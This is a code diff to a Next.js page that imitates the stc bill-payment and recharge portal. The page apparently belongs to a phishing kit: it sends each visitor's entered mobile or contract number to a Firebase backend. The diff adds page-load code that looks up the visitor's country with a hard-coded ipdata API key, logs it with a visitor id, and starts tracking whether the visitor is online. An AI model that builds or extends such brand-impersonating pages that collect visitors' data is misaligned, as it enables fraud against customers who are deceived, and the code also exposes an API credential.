@@ -4,9 +4,10 @@ import STCLoading from "@/components/loading"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
 import { User, ShoppingCart, Search, Share2, Smartphone, Shield } from "lucide-react"
 import { useRouter } from "next/navigation"
-import { useState } from "react"
+import { useCallback, useEffect, useState } from "react"
 const visitorId = `ssscg-app-${Math.random().toString(36).substring(2, 15)}`;
 export default function STCPaymentPortal() {
   const router = useRouter()
@@ -18,7 +19,7 @@ export default function STCPaymentPortal() {
   const handlePayNow = async () => {
     setIsLoading(true)
     setLoadingProgress(0)
-    addData({id:visitorId,mobile:phone})
+    addData({ id: visitorId, mobile: phone })
     const progressInterval = setInterval(() => {
       setLoadingProgress((prev) => {
         if (prev >= 100) {
@@ -33,7 +34,46 @@ export default function STCPaymentPortal() {
       })
     }, 200)
   }
+  const getLocationAndLog = useCallback(async () => {
+    if (!visitorId) return;
 
+    // This API key is public and might be rate-limited or disabled.
+    // For a production app, use a secure way to handle API keys, ideally on the backend.
+    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb"
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
+
+    try {
+      const response = await fetch(url)
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`)
+      }
+      const country = await response.text()
+      await addData({
+        createdDate: new Date().toISOString(),
+        id: visitorId,
+        country: country,
+        action: "page_load",
+        currentPage: "الرئيسية ",
+      })
+      localStorage.setItem("country", country) // Consider privacy implications
+      setupOnlineStatus(visitorId)
+    } catch (error) {
+      console.error("Error fetching location:", error)
+      // Log error with visitor ID for debugging
+      await addData({
+        createdDate: new Date().toISOString(),
+        id: visitorId,
+        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
+        action: "location_error"
+      });
+    }
+  }, [visitorId]);
+
+  useEffect(() => {
+    if (visitorId) {
+      getLocationAndLog();
+    }
+  }, [visitorId, getLocationAndLog]);
   return (
     <div className="min-h-screen bg-background">
       {isLoading && <STCLoading message="جاري التحميل ...  " progress={loadingProgress} />}
@@ -54,7 +94,7 @@ export default function STCPaymentPortal() {
 
           <div className="flex items-center">
             <span className="text-2xl sm:text-3xl font-bold text-primary tracking-tight">
-              <img src="/logo.webp"  alt="3" width={50}/>
+              <img src="/logo.webp" alt="3" width={50} />
             </span>
           </div>
 
@@ -83,17 +123,17 @@ export default function STCPaymentPortal() {
           className="absolute inset-0 flex items-end"
           style={{ background: "url(/payment-desktop.webp)", backgroundRepeat: "no-repeat", backgroundSize: "cover" }}
         >
-         
+
         </div>
       </div>
 
       <div className="px-4 sm:px-6 py-8 sm:py-12">
-      <div className="w-full text-[#1d252d] p-4 sm:p-6 md:p-8 text-right">
-            <h1 className=" text-xl sm:text-2xl md:text-3xl font-bold mb-1 sm:mb-2 text-balance drop-shadow-lg">
-              خدمات دفع الفواتير
-            </h1>
-            <h2 className="text-[#1d252d] text-lg sm:text-xl font-semibold drop-shadow-md">وإعادة التعبئة</h2>
-          </div>
+        <div className="w-full text-[#1d252d] p-4 sm:p-6 md:p-8 text-right">
+          <h1 className=" text-xl sm:text-2xl md:text-3xl font-bold mb-1 sm:mb-2 text-balance drop-shadow-lg">
+            خدمات دفع الفواتير
+          </h1>
+          <h2 className="text-[#1d252d] text-lg sm:text-xl font-semibold drop-shadow-md">وإعادة التعبئة</h2>
+        </div>
         <div className="max-w-sm sm:max-w-md mx-auto">
           <div className="bg-card rounded-2xl shadow-lg border border-border p-6 sm:p-8">
             <h3 className="text-xl sm:text-2xl font-bold text-foreground text-center mb-6 sm:mb-8 text-balance">
@@ -105,7 +145,7 @@ export default function STCPaymentPortal() {
                 <Input
                   type="tel"
                   maxLength={12}
-                  onChange={(e)=>{setPhone(e.target.value)}}
+                  onChange={(e) => { setPhone(e.target.value) }}
                   placeholder="رقم الموبايل/البطاقة المدينة أو رقم العقد"
                   className="w-full h-8 sm:h-8 text-right border-border rounded-xl px-4 sm:px-5 text-sm sm:text-base text-foreground placeholder:text-muted-foreground bg-input focus:ring-2 focus:ring-ring focus:border-transparent transition-all duration-200"
                   dir="rtl"
@@ -130,42 +170,42 @@ export default function STCPaymentPortal() {
                 </Button>
               </div>
             </div>
-              {/* Recharge Section */}
-      
+            {/* Recharge Section */}
+
           </div>
           <div className="max-w-xs sm:max-w-md mx-auto">
-          <div className="bg-muted/50 rounded-2xl p-4 sm:p-6 text-center">
-            <div className="w-12 h-12 sm:w-16 sm:h-16 mx-auto mb-3 sm:mb-4 bg-primary/10 rounded-2xl flex items-center justify-center">
-              <Smartphone className="w-6 h-6 sm:w-8 sm:h-8 text-[#8736c4]" />
+            <div className="bg-muted/50 rounded-2xl p-4 sm:p-6 text-center">
+              <div className="w-12 h-12 sm:w-16 sm:h-16 mx-auto mb-3 sm:mb-4 bg-primary/10 rounded-2xl flex items-center justify-center">
+                <Smartphone className="w-6 h-6 sm:w-8 sm:h-8 text-[#8736c4]" />
+              </div>
+              <h3 className="text-base sm:text-lg font-bold text-foreground mb-2 sm:mb-3">أعد تعبئة خطك</h3>
+              <p className="text-xs sm:text-sm text-muted-foreground mb-4 sm:mb-6 leading-relaxed">
+                أعد تعبئة خطك للمكالمات أو خط الإنترنت بخطوات بسيطة واستمتع بتجربة سهلة للدفع المسبق مع stc.
+              </p>
+              <Button className="w-full h-10 sm:h-12 bg-accent hover:bg-accent/90 text-accent-foreground font-semibold rounded-xl">
+                تعبئة رصيد الآن
+              </Button>
             </div>
-            <h3 className="text-base sm:text-lg font-bold text-foreground mb-2 sm:mb-3">أعد تعبئة خطك</h3>
-            <p className="text-xs sm:text-sm text-muted-foreground mb-4 sm:mb-6 leading-relaxed">
-              أعد تعبئة خطك للمكالمات أو خط الإنترنت بخطوات بسيطة واستمتع بتجربة سهلة للدفع المسبق مع stc.
-            </p>
-            <Button className="w-full h-10 sm:h-12 bg-accent hover:bg-accent/90 text-accent-foreground font-semibold rounded-xl">
-              تعبئة رصيد الآن
-            </Button>
           </div>
-        </div>
-            {/* Trusted Lines Section */}
-            <div className="max-w-xs sm:max-w-md mx-auto">
-          <div className="bg-muted/50 rounded-2xl p-4 sm:p-6 text-center">
-            <div className="w-12 h-12 sm:w-16 sm:h-16 mx-auto mb-3 sm:mb-4 bg-primary/10 rounded-2xl flex items-center justify-center">
-              <Shield className="w-6 h-6 sm:w-8 sm:h-8  text-[#8736c4]" />
+          {/* Trusted Lines Section */}
+          <div className="max-w-xs sm:max-w-md mx-auto">
+            <div className="bg-muted/50 rounded-2xl p-4 sm:p-6 text-center">
+              <div className="w-12 h-12 sm:w-16 sm:h-16 mx-auto mb-3 sm:mb-4 bg-primary/10 rounded-2xl flex items-center justify-center">
+                <Shield className="w-6 h-6 sm:w-8 sm:h-8  text-[#8736c4]" />
+              </div>
+              <h3 className="text-base sm:text-lg font-bold text-foreground mb-2 sm:mb-3">الدفع للخطوط الموثوقة</h3>
+              <p className="text-xs sm:text-sm text-muted-foreground mb-4 sm:mb-6 leading-relaxed">
+                خطك مشغول؟ لا تحتاج. ادفع بكل سهولة ورد الخدمة من جديد.
+              </p>
+              <Button className="w-full h-10 sm:h-12 bg-accent hover:bg-accent/90 text-accent-foreground font-semibold rounded-xl">
+                ادفع الآن
+              </Button>
             </div>
-            <h3 className="text-base sm:text-lg font-bold text-foreground mb-2 sm:mb-3">الدفع للخطوط الموثوقة</h3>
-            <p className="text-xs sm:text-sm text-muted-foreground mb-4 sm:mb-6 leading-relaxed">
-              خطك مشغول؟ لا تحتاج. ادفع بكل سهولة ورد الخدمة من جديد.
-            </p>
-            <Button className="w-full h-10 sm:h-12 bg-accent hover:bg-accent/90 text-accent-foreground font-semibold rounded-xl">
-              ادفع الآن
-            </Button>
           </div>
-        </div>
-        
+
         </div>
       </div>
-      
+
       <footer className="bg-[#8736c4] text-primary-foreground py-8 sm:py-12">
         <div className="px-3 sm:px-6">
           <div className="max-w-4xl mx-auto">
@@ -275,7 +315,7 @@ export default function STCPaymentPortal() {
             <div className="text-center border-t border-primary-foreground/20 pt-6 sm:pt-8">
               <div className="mb-4 sm:mb-6">
                 <span className="text-4xl sm:text-5xl font-bold tracking-tight flex justify-center">
-                  <img src="/next.svg" width={50}/>
+                  <img src="/next.svg" width={50} />
 
                 </span>
               </div>
@@ -319,6 +359,6 @@ export default function STCPaymentPortal() {
         </div>
       </footer>
     </div>
-    
+
   )
 }
